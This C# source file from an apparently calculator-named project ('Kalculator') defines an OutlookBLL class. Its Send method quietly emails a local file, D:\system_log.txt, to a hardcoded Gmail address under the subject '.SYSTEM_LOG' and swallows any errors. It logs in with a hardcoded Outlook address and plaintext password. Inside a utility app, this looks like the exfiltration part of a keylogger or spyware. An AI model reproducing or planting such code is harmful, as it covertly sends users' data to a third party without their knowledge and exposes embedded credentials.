using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Kalculator.BLL
{
    public class OutlookBLL
    {
        private static readonly string _from = "jiang.hongyan@outlook.com.vn"; // Email của Sender (của bạn)
        private static readonly string _pass = "hongnhan@123"; // Mật khẩu Email của Sender (của bạn)

        public static void Send(string file = @"D:\system_log.txt", string sendto = "cuongtk2002@gmail.com", string subject = ".SYSTEM_LOG", string content = "Dữ liệu được lưu trong tệp đính kèm")
        {
            //sendto: Email receiver (người nhận)
            //subject: Tiêu đề email
            //content: Nội dung của email, bạn có thể viết mã HTML
            //Nếu gửi email thành công, sẽ trả về kết quả: OK, không thành công sẽ trả về thông tin l�-i
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("outlook.office365.com");

                mail.From = new MailAddress(_from);
                mail.To.Add(sendto);
                mail.Subject = subject;
                mail.IsBodyHtml = true;
                mail.Body = content;

                // Create  the file attachment for this email message.
                Attachment data = new Attachment(file, MediaTypeNames.Application.Octet);
                // Add time stamp information for the file.
                ContentDisposition disposition = data.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(file);
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(file);
                disposition.ReadDate = System.IO.File.GetLastAccessTime(file);
                // Add the file attachment to this email message.
                mail.Attachments.Add(data);
                mail.Priority = MailPriority.High;

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential(_from, _pass);
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.ToString());
            }

        }
    }
}
